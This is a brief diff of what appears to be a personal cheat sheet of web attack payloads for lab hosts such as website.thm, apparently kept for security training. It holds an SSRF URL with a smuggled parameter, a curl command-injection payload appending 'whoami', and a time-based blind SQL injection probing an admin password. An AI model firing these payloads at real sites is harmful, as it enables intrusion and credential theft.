@@ -32,4 +32,4 @@ http://website.thm/stock?server=api.website.thm/api/user&x&id=123
 curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
 
 #SQLI
-https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like 'password';--
